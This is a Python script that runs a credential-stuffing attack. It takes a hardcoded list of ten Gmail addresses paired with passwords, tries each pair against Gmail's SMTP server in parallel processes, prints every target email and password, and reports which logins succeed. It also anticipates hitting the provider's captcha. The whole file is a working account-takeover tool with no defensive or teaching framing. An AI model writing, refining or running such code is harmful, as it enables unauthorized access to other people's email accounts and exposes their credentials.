import smtplib
from smtplib import SMTPAuthenticationError
from concurrent.futures import ProcessPoolExecutor
import os

# List of emails and passwords
email_list = [
    "joshuaturner@gmail.com|b6:1Nf,y-5Jd",
    "noahp@gmail.com|r2jKcX:m:(%7",
    "jamesr@gmail.com|Mp3:kBj8&S0w",
    "kevinturner@gmail.com|17?T1q&d1kiU",
    "vincent_anderson@gmail.com|wk?D6O<U9W}r",
    "bward@gmail.com|I}CyPIdyL7I,",
    "mark.evans@gmail.com|0$Y<LOE3k((T",
    "bryanpatel@gmail.com|i9rV4__!S(S6",
    "william.morgan@gmail.com|8K?,eMCW?jh&",
    "richard.mendoza@gmail.com|G&54>C*0x&E]"
]

# Function to process each email
def process_email(email_info):
    email, password = email_info.split('|')
    print(f'Target Email: {email}, Password: {password}')
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(email, password)
        print(f'Successfully logged in to {email}')
    except SMTPAuthenticationError as e:
        print(f"Error Authenticating or you hit the captcha for {email}! {e}")
    finally:
        server.quit()

# Use ProcessPoolExecutor to multiprocess the list of emails
if __name__ == "__main__":
    with ProcessPoolExecutor(max_workers=os.cpu_count()) as executor:
        executor.map(process_email, email_list)
